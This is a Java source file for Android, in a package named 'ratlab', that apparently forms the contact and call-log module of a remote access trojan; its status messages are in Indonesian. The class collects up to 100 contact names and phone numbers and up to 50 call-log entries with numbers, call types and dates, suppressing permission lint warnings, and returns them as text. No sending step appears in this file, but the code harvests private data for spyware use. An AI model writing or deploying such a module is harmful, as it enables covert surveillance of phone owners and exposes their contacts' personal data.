package com.ratlab;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;

public class ContactModule {

    private final Context ctx;

    public ContactModule(Context ctx) {
        this.ctx = ctx;
    }

    @SuppressLint("MissingPermission")
    public String list() {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            if (c == null) return "Tidak bisa akses kontak";
            int n = 0;
            while (c.moveToNext() && n < 100) {
                String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append(name).append(" — ").append(phone).append("\n");
                n++;
            }
            c.close();
            return sb.length() == 0 ? "Kosong" : sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    @SuppressLint("MissingPermission")
    public String callLog() {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = ctx.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c == null) return "Tidak bisa akses call log";
            int n = 0;
            while (c.moveToNext() && n < 50) {
                String num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DATE));
                sb.append("[").append(date).append("] ").append(num).append(" (type ").append(type).append(")\n");
                n++;
            }
            c.close();
            return sb.length() == 0 ? "Kosong" : sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
